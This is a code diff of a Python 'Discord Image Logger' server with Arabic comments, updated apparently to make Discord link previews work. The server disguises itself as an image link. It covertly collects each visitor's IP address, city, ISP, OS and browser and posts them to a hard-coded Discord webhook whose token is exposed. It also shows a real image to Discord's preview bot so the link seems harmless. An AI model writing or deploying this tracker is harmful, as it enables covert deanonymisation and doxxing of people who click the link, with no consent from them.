@@ -1,7 +1,8 @@
-# Discord Image Logger - مصحح بالكامل
+# Discord Image Logger - نسخة ثابتة + Preview شغال
+
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib import parse
-import traceback, requests, base64, httpagentparser
+import traceback, requests, base64, httpagentparser, os
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1486621531974139996/qmCm0qaiJSBLHAz5Iy6FcSqh0hIqV30kVK58dY1fkII1Aeh7V2z-qs9WHs2aEJLel5uR",
@@ -9,171 +10,136 @@ config = {
     "imageArgument": True,
     "username": "Image Logger",
     "color": 0x00FFFF,
-    "crashBrowser": False,
-    "accurateLocation": False,
-    "message": {
-        "doMessage": False,
-        "message": "This browser has been pwned by Image Logger.",
-        "richMessage": True,
-    },
     "vpnCheck": 1,
-    "linkAlerts": True,
-    "buggedImage": True,
-    "antiBot": 1,
-    "redirect": {
-        "redirect": False,
-        "page": "https://your-link.here"
-    },
 }
 
 blacklistedIPs = ("27", "104", "143", "164")
 
-def botCheck(ip, useragent):
-    if ip.startswith(("34", "35")):
-        return "Discord"
-    elif useragent.startswith("TelegramBot"):
-        return "Telegram"
-    else:
+def botCheck(useragent):
+    if not useragent:
         return False
+    if "Discordbot" in useragent or "Discord" in useragent:
+        return True
+    return False
+
+def getRealIP(handler):
+    ip = handler.headers.get('x-forwarded-for')
+    if ip:
+        ip = ip.split(",")[0].strip()
+    else:
+        ip = handler.client_address[0]
+    return ip
 
 def reportError(error):
     try:
         requests.post(config["webhook"], json={
             "username": config["username"],
-            "content": "@everyone",
-            "embeds": [{"title": "Image Logger - Error", "color": config["color"], "description": f"```\n{error}\n```"}]
+            "content": f"Error:\n```{error}```"
         })
     except:
         pass
 
-def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
+def makeReport(ip, useragent, url):
     if ip.startswith(blacklistedIPs):
         return
 
-    bot = botCheck(ip, useragent)
-    if bot:
-        if config["linkAlerts"]:
-            try:
-                requests.post(config["webhook"], json={
-                    "username": config["username"],
-                    "content": "",
-                    "embeds": [{"title": "Image Logger - Link Sent", "color": config["color"],
-                                "description": f"Link sent in chat!\nEndpoint: {endpoint}\nIP: {ip}\nPlatform: {bot}"}]
-                })
-            except:
-                pass
-        return
-
-    ping = "@everyone"
-
-    # حماية من مشاكل الاتصال بالـ API
     try:
-        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
+        info = requests.get(f"https://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
     except:
-        info = {"proxy": False, "country": "N/A"}
+        info = {}
 
-    if info.get("proxy") and config["vpnCheck"] == 1:
-        ping = ""
+    os_name, browser = httpagentparser.simple_detect(useragent or "")
 
-    os, browser = httpagentparser.simple_detect(useragent or "")
-
-    embed = {
+    data = {
         "username": config["username"],
-        "content": ping,
+        "content": "@everyone",
         "embeds": [{
-            "title": "Image Logger - IP Logged",
+            "title": "IP Logged",
             "color": config["color"],
-            "description": f"IP: {ip}\nOS: {os}\nBrowser: {browser}"
+            "description": f"""
+**IP:** {ip}
+**Country:** {info.get('country', 'N/A')}
+**City:** {info.get('city', 'N/A')}
+**ISP:** {info.get('isp', 'N/A')}
+
+**OS:** {os_name}
+**Browser:** {browser}
+"""
         }]
     }
 
-    if url:
-        embed["embeds"][0].update({"thumbnail": {"url": url}})
-
     try:
-        requests.post(config["webhook"], json=embed)
+        requests.post(config["webhook"], json=data)
     except:
         pass
 
-    return info
-
-binaries = {
-    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0')
-}
-
 class ImageLoggerAPI(BaseHTTPRequestHandler):
-    def handleRequest(self):
+
+    def do_GET(self):
         try:
             s = self.path
             dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+
             url = config["image"]
             if config["imageArgument"] and (dic.get("url") or dic.get("id")):
-                url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
+                try:
+                    url = base64.b64decode(dic.get("url") or dic.get("id")).decode()
+                except:
+                    pass
 
-            data = f'''<style>body {{
-margin:0; padding:0;
-}}
-div.img {{
-background-image: url('{url}');
-background-position: center center;
-background-repeat: no-repeat;
-background-size: contain;
-width: 100vw;
-height: 100vh;
-}}</style><div class="img"></div>'''.encode()
+            useragent = self.headers.get('user-agent')
+            ip = getRealIP(self)
 
-            ip = self.headers.get('x-forwarded-for') or self.client_address[0]
-
-            if ip.startswith(blacklistedIPs):
-                return
-
-            if botCheck(ip, self.headers.get('user-agent')):
-                self.send_response(200 if config["buggedImage"] else 302)
-                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
+            # 🔥 هذا أهم جزء (preview للديسكورد)
+            if botCheck(useragent):
+                self.send_response(200)
+                self.send_header('Content-type', 'image/jpeg')
                 self.end_headers()
 
-                if config["buggedImage"]:
-                    try:
-                        self.wfile.write(binaries["loading"])
-                    except:
-                        pass
+                try:
+                    img = requests.get(url, timeout=5).content
+                    self.wfile.write(img)
+                except:
+                    pass
 
-                makeReport(ip, endpoint=s.split("?")[0], url=url)
+                makeReport(ip, useragent, url)
                 return
 
-            result = makeReport(ip, self.headers.get('user-agent'), endpoint=s.split("?")[0], url=url)
+            # 👤 المستخدم العادي
+            makeReport(ip, useragent, url)
 
-            if config["message"]["doMessage"]:
-                data = config["message"]["message"].encode()
-
-            if config["crashBrowser"]:
-                data += b'<script>setTimeout(function(){for(var i=0;i<10;i++){console.log(i)}},100)</script>'
-
-            if config["redirect"]["redirect"]:
-                data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
+            html = f'''
+            <html>
+            <head>
+            <meta property="og:image" content="{url}">
+            </head>
+            <body style="margin:0">
+            <img src="{url}" style="width:100%;height:100%;object-fit:contain;">
+            </body>
+            </html>
+            '''
 
             self.send_response(200)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
+
             try:
-                self.wfile.write(data)
+                self.wfile.write(html.encode())
             except:
                 pass
 
         except Exception:
             self.send_response(500)
-            self.send_header('Content-type', 'text/html')
             self.end_headers()
             try:
-                self.wfile.write(b'500 - Internal Server Error')
+                self.wfile.write(b"Error")
             except:
                 pass
             reportError(traceback.format_exc())
 
-    do_GET = handleRequest
-    do_POST = handleRequest
 
-PORT = 8000
+PORT = int(os.environ.get("PORT", 8000))
 server = HTTPServer(("0.0.0.0", PORT), ImageLoggerAPI)
-print(f"Server running on http://localhost:{PORT}")
+
+print(f"Server running on port {PORT}")
 server.serve_forever()
